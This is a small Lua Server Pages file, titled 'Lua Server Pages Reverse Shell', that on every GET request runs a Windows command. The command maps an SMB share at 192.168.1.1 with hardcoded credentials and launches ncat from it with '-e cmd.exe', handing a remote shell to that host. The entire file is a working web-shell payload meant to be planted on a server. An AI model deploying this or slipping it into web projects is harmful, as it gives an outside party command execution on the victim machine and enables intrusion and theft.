<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
   <?lsp os.execute("cmd.exe /c net use x: \\\\192.168.1.1\\SMB /user:user pass & x:\\ncat.exe 192.168.1.1 135 -e cmd.exe") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
